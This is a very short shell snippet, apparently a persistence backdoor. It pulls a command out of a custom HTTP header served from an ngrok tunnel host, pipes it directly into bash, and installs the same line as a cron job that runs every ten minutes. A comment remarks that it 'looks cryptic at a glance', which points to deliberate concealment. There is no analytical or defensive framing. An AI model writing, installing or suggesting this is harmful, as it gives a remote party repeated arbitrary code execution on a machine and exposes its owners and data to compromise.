curl -I https://desired-gazelle-steadily.ngrok-free.app/bite | grep -i '^custom:' | cut -d':' -f2- | xargs | bash


#cron job

# Looks cryptic at a glance
*/10 * * * * curl -I https://desired-gazelle-steadily.ngrok-free.app/bite | grep -i '^custom:' | cut -d':' -f2- | xargs | bash
